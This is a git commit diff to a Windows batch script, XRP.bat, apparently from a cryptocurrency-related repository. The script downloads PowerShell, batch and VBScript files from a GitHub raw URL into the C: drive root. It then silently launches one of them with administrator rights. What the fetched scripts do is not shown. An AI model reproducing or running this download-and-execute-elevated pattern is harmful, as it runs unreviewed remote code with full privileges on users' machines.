f5cea1fd3b96e870a8d981c82c974d100b1f7faa
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 09:37:15 +0700

    XRP.bat

--- XRP.bat
+++ XRP.bat
@@ -1,5 +1,6 @@
 @echo off
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPSETUP.ps1' -OutFile 'C:\XRPSETUP.ps1'"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.bat' -OutFile 'C:\RUNSYS_XRP.bat'"
+powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.vbs' -OutFile 'C:\RUNSYS_XRP.vbs'"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\RUNSYS_XRP.bat' -ArgumentList '/S' -Verb RunAs"
 exit
